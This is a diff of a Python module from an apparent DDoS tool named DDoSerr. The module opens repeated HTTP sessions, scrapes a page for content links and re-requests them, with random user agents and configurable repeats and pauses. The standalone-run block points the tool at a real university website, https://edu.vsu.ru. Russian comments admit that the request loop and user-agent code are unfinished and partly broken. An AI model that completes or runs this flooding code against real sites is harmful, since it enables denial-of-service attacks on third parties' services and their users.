@@ -60,7 +60,7 @@ DDoSerr Copyright © 2018 Константин Панков
 
 """
 Модуль отправки HTTP-запросов для DDoSerr.
-v.1.6.1.2b. от 02.08.2018.
+v.1.6.1.3b. от 02.08.2018.
 """
 
 """
@@ -84,12 +84,13 @@ import html_parser
 #Подключаем модуль работы с user agent-ами.
 import user_agents
 
+
 #Настройка логгирования.
 logging.basicConfig(filename='log.log',level=logging.INFO, \
 format='%(asctime)s %(message)s', datefmt='%d.%m.%Y - %I:%M:%S |')
 
 
-def http_connection(repeat, pause, content_urls):
+def http_connection(repeat, pause, url):
     #(repeat, pause, url="http://127.0.0.1")
     """
     Функция для создания 1 процесса, запросов к сайту и получения ответа.
@@ -100,14 +101,19 @@ def http_connection(repeat, pause, content_urls):
     #!Добавить в аргументы user_agent!
     #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
-    random_agent = user_agents.Agents().random_agent().random_agent
-    content_urls = html_parser.obj_search(url).content_urls
+    
+    #!Вызов парсера странцы и получение списка ссылок 
+    #на подгружаемый контент.
+    #Возможно, надо будет засунуть в цикл. Или нет.
+    content_urls = html_parser.obj_search(url)
 
     #Цикл выполняет задание 'repeat' раз в каждом процессе.
     for _ in range(repeat):
         #Создаём сессию.
         session = requests.Session()
         
+        #Вызываем модуль агентов и получаем рандомного агента из списка.
+        random_agent = user_agents.Agents().random_agent()
         
         #Отправляем один запрос к заглавной странице.
         #main_page = session.get(url, stream=True)
@@ -121,14 +127,37 @@ def http_connection(repeat, pause, content_urls):
         !Добавить выбор рандомного юзер агента. Переделать headers!
         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         """
+        
+        #---
+        #Отладка.
+        #print(content_urls)
+        #---
+        
         #!!!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         #!Запрос контента со страницы по найденным ссылкам.
-        #!Возможно, цикл не правильный.
-        for i in content_urls:
-            current_url = str(content_urls[i])
-            headers = {random_agent}
-            content_main_page = session.get(content_urls[i], headers=headers)
+        #!Возможно, цикл неправильный и даже не нужен...
+        #!Пока цикл не работает.
+        for item in range(len(content_urls)):
+            #Это задумывалось как система прохода по списку ссылок 
+            #на контент для его подгрузки.
+            #И всё это должно подгружаться сразу, для каждой сессии,
+            #поэтому нужен отдельный цикл внутри задания... Наверное.
             
+            current_url = content_urls[item]
+            #current_url = str(content_urls[item])
+            
+            #!С юзер агентом. Пока не работает совсем.
+            ##headers = {random_agent}
+            ##content_main_page = session.get(current_url, headers=headers)
+            
+            #---
+            #Проблема с заданием юзер агента. Без него работает. Но криво.
+            content_main_page = session.get(current_url)
+            #---
+            
+            #!!!Это работает не так, как надо! 
+            #Делается 'repeat' запросов только на первый адрес.
+        
         
         #Для main_page.
         #Код возврата.
@@ -165,6 +194,10 @@ def http_connection(repeat, pause, content_urls):
 
 
 if __name__ == "__main__":
+    #Временные параметры для самостоятельного запуска.
+    repeat = 5
+    pause = 0.5
+    url = "https://edu.vsu.ru"
+    content_urls = html_parser.obj_search(url)
     #Запуск функции.
     http_connection(repeat, pause, url)
-
